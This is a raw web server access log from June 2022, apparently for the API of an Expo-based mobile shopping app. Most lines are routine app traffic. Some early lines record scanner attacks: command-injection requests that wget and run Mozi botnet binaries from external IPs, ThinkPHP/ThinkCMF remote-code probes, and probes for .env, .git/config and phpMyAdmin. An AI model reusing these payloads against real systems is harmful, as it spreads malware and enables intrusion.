::1 - - [29/Jun/2022:00:05:53 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://112.95.92.74:33693/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 144 "-" "Hello, world"
::ffff:127.0.0.1 - - [29/Jun/2022:00:13:00 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:01:57:32 +0000] "GET / HTTP/1.0" 404 139 "-" "python-requests/2.28.0"
::1 - - [29/Jun/2022:02:03:14 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:02:05:41 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:02:05:42 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:03:08:12 +0000] "GET /.git/config HTTP/1.0" 404 150 "-" "Mozilla/5.0 (iPad; CPU OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/79.0.259819395 Mobile/17A5556d Safari/604.1"
::1 - - [29/Jun/2022:03:50:02 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [29/Jun/2022:04:03:22 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 189 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:04:23:11 +0000] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.0" 404 182 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::1 - - [29/Jun/2022:04:42:21 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:04:44:34 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::1 - - [29/Jun/2022:04:44:37 +0000] "GET / HTTP/1.0" 404 139 "http://159.223.82.71:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:127.0.0.1 - - [29/Jun/2022:04:48:20 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::1 - - [29/Jun/2022:05:06:15 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:05:06:16 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:05:16:31 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:05:16:44 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [29/Jun/2022:05:50:40 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.54.216.138:49880/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:127.0.0.1 - - [29/Jun/2022:06:01:19 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [29/Jun/2022:06:14:43 +0000] "GET / HTTP/1.0" 404 139 "-" "'Mozilla/5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:06:40:55 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [29/Jun/2022:07:26:01 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:07:26:04 +0000] "GET /console/ HTTP/1.0" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [29/Jun/2022:07:41:50 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:08:05:45 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:08:05:46 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:08:17:31 +0000] "HEAD /phpmyadmin/ HTTP/1.0" 404 151 "-" "revolt"
::1 - - [29/Jun/2022:08:17:31 +0000] "HEAD /phpMyadmin/ HTTP/1.0" 404 151 "-" "revolt"
::ffff:127.0.0.1 - - [29/Jun/2022:08:17:31 +0000] "HEAD /phpMyAdmin/ HTTP/1.0" 404 151 "-" "revolt"
::1 - - [29/Jun/2022:08:17:31 +0000] "HEAD /phpmyAdmin/ HTTP/1.0" 404 151 "-" "revolt"
::ffff:127.0.0.1 - - [29/Jun/2022:08:17:31 +0000] "HEAD /phpMyAdmin/index.php HTTP/1.0" 404 160 "-" "revolt"
::1 - - [29/Jun/2022:08:17:31 +0000] "HEAD /phpmyadmin/index.php HTTP/1.0" 404 160 "-" "revolt"
::ffff:127.0.0.1 - - [29/Jun/2022:08:28:00 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [29/Jun/2022:08:38:42 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36"
::1 - - [29/Jun/2022:08:40:45 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:40:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:40:45 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:41:36 +0000] "GET /.git/config HTTP/1.0" 404 150 "-" "python-requests/2.25.1"
::ffff:127.0.0.1 - - [29/Jun/2022:08:44:25 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:44:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:44:26 +0000] "GET /api/v1/users/logout HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:44:50 +0000] "POST /api/v1/users HTTP/1.0" 500 251 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:44:55 +0000] "POST /api/v1/users HTTP/1.0" 200 514 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:44:55 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:44:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:44:55 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:45:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:45:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:45:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:47:31 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:47:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:47:36 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:47:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:47:36 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:47:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:47:37 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:47:38 +0000] "GET /api/v1/users/logout HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:48:00 +0000] "POST /api/v1/users HTTP/1.0" 200 511 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:48:00 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:48:00 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:48:01 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:49:14 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:49:14 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:49:14 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:49:40 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:49:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:49:40 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:49:43 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:49:43 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 401 283 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:49:43 +0000] "GET /api/v1/users/logout HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:50:28 +0000] "POST /api/v1/users HTTP/1.0" 200 511 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:50:32 +0000] "POST /api/v1/users/login HTTP/1.0" 200 511 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:50:32 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:50:33 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:50:33 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:58:22 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:58:22 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:58:22 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:08:58:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:08:58:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:02:31 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:02:32 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:03:28 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:03:28 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:03:29 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:03:48 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:03:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:04:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:04:06 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:05:27 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:05:34 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:05:34 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:05:35 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:05:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:05:35 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:06:07 +0000] "POST /api/v1/goods HTTP/1.0" 200 345 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:06:08 +0000] "POST /api/v1/transactions HTTP/1.0" 200 256 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:06:09 +0000] "PUT /api/v1/goods/62bc15fff4282e7602a2815d/upload-photo HTTP/1.0" 200 60 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:06:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 393 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:06:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 508 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:06:21 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 243 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:06:22 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:06:22 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:06:25 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:06:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 510 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:06:30 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:06:31 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:06:32 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:06:32 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:06:33 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:06:33 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:06:33 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:06:35 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:06:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:06:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:06:36 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:06:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:06:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:06:41 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 200 494 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:07:16 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:07:26 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:07:33 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:07:51 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:07:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:07:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:07:53 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:07:53 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:07:53 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:07:54 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:07:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:07:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:07:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:08:02 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:08:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:08:08 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
